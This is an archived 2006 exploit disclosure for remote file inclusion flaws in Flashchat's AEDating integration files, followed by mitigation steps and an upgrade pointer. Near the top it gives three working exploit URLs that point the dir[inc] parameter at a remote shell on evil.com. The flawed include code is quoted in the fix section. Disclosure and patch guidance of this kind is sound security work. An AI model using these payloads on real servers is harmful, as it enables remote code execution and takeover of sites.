@@ -1,0 +1,47 @@
+NeXtMaN <mc.nadz [at] gmail.com>
+
+Here are 3 RFI vulnerabilities in Flashchat i've found:
+
+Code:
+http://site.com/[script_path]/inc/cmses/aedating4CMS.php?dir[inc]=http://evil.com/shell.txt?
+http://site.com/[script_path]/inc/cmses/aedatingCMS2.php?dir[inc]=http://evil.com/shell.txt?
+http://site.com/[script_path]/inc/cmses/aedatingCMS.php?dir[inc]=http://evil.com/shell.txt?
+
+video here:
+
+Code:
+http://rapidshare.de/files/31362430/Flashchat.rar.html
+
+
+EDIT: Solution:
+
+
+It looks like the vulnerable files are there in case you want to integrate with another script. The script that would require these files is AEDating:
+
+you simply delete the following files and you will be secure:
+
+/inc/cmses/aedating4CMS.php
+/inc/cmses/aedatingCMS.php
+/inc/cmses/aedatingCMS2.php
+
+if your flashchat is integrated with AEDating and/or you dont want to delete the files you can just edit the 3 files to use your path like this:
+
+Replace this:
+
+$aed_root_path = realpath(dirname(__FILE__) . '/../../../') . '/';
+include($aed_root_path . 'inc/header.inc.php');
+require_once( "$dir[inc]db.inc.php" );
+require_once( "$dir[inc]admin.inc.php" );
+
+With this:
+
+$aed_root_path = realpath(dirname(__FILE__) . '/../../../') . '/';
+include($aed_root_path . 'inc/header.inc.php');
+require_once( "[Your AED path]/db.inc.php" );
+require_once( "[Your AED path]/admin.inc.php" );
+
+Alternatively you could just upgrade to 4.6.2 (just released)
+
+PS, all 3 of those files are vulnerable and will need editing.
+
+# milw0rm.com [2006-09-04]
